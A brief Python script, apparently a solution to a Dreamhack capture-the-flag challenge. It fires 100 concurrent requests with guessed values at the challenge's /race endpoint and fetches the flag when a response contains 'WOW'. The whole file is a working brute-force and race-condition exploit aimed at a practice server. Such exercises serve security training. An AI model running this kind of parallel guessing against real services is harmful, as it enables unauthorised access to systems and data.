import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://host8.dreamhack.games:21478/race"

def attack(guess_num):
  try:
    res = requests.get(url, params={'user':guess_num})
    if 'WOW' in res.text:
      result = requests.get('http://host8.dreamhack.games:21478/flag')
      print(result.text)
  
  except Exception as e:
    pass

if __name__ == "__main__":
  with ThreadPoolExecutor(max_workers=100) as excuter:
    excuter.map(attack, range(1,101))

